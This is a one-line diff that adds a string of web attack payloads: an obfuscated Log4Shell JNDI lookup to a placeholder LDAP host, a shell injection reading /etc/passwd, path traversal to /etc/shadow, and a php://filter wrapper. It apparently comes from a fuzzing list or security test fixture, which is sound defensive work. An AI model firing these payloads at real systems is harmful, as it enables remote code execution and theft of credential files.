@@ -1,0 +1,1 @@
+${${lower:j}${::-n}di:ldap://x} ;cat /etc/passwd ../../etc/shadow php://filter
